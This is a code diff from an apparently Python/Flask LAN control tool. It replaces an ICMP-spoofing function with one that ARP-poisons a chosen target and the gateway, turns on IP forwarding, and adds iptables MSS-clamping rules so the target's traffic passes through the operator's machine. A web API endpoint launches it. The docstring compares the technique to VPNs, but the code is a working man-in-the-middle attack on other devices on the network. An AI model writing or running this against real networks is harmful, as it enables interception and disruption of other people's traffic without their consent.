@@ -74,22 +74,52 @@ def spoof_loop(target_ip, gateway_ip, stop_event):
             time.sleep(2)
     except: pass
 
-def mtu_loop(target_ip, gateway_ip, mtu_limit, stop_event):
+def mtu_limit_mitm_loop(target_ip, gateway_ip, mtu_val, stop_event):
+    """
+    Enforces an MTU limit by:
+    1. ARP-spoofing the target to route their traffic through this machine (MitM).
+    2. Enabling IP forwarding so we relay packets instead of dropping them.
+    3. Using iptables to clamp the TCP MSS to (mtu_val - 40) on all forwarded SYN packets.
+    This is the same technique used by VPNs and PPPoE routers.
+    """
+    mss_val = max(1, int(mtu_val) - 40)
     try:
         target_mac = get_mac(target_ip)
-        if not target_mac: return
-        
+        gateway_mac = get_mac(gateway_ip)
+        if not target_mac or not gateway_mac:
+            print(f"[!] MTU Limit: Could not resolve MACs for {target_ip}")
+            return
+
+        # Enable IP forwarding so we relay packets as a router
+        os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
+
+        # Add iptables MSS clamping rules for both directions
+        os.system(f"iptables -t mangle -A FORWARD -s {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
+        os.system(f"iptables -t mangle -A FORWARD -d {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
+        print(f"[+] MTU Limit: Clamping MSS to {mss_val} for {target_ip} (MTU ~{mtu_val})")
+
+        # ARP spoof loop — poisons target AND gateway to route traffic through us
         while not stop_event.is_set():
-            try:
-                icmp = ICMP(type=3, code=4, nexthopmtu=int(mtu_limit))
-            except:
-                icmp = ICMP(type=3, code=4, unused=int(mtu_limit))
-                
-            pkt = Ether(dst=target_mac)/IP(src=gateway_ip, dst=target_ip)/icmp/IP(src=target_ip, dst=gateway_ip)
-            sendp(pkt, iface=state["iface"], verbose=0)
-            time.sleep(1)
+            # Tell target: "I am the gateway"
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
+            # Tell gateway: "I am the target"
+            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
+            time.sleep(2)
+
     except Exception as e:
         print(f"[!] MTU Limit error: {e}")
+    finally:
+        # Remove our iptables rules
+        os.system(f"iptables -t mangle -D FORWARD -s {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
+        os.system(f"iptables -t mangle -D FORWARD -d {target_ip} -p tcp --syn -j TCPMSS --set-mss {mss_val}")
+        print(f"[-] MTU Limit: Removed MSS clamp rules for {target_ip}")
+
+        # Restore ARP tables on target and gateway
+        try:
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
+            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
+        except:
+            pass
 
 def run_arp_scan(subnet):
     state["scanning"] = True
@@ -236,7 +266,7 @@ def api_toggle_mtu():
             mtu_val = 800
         stop_event = threading.Event()
         state["active_mtu_limits"][target_ip] = {'event': stop_event, 'val': mtu_val}
-        threading.Thread(target=mtu_loop, args=(target_ip, gateway_ip, mtu_val, stop_event), daemon=True).start()
+        threading.Thread(target=mtu_limit_mitm_loop, args=(target_ip, gateway_ip, mtu_val, stop_event), daemon=True).start()
         
     return jsonify({"success": True})
 
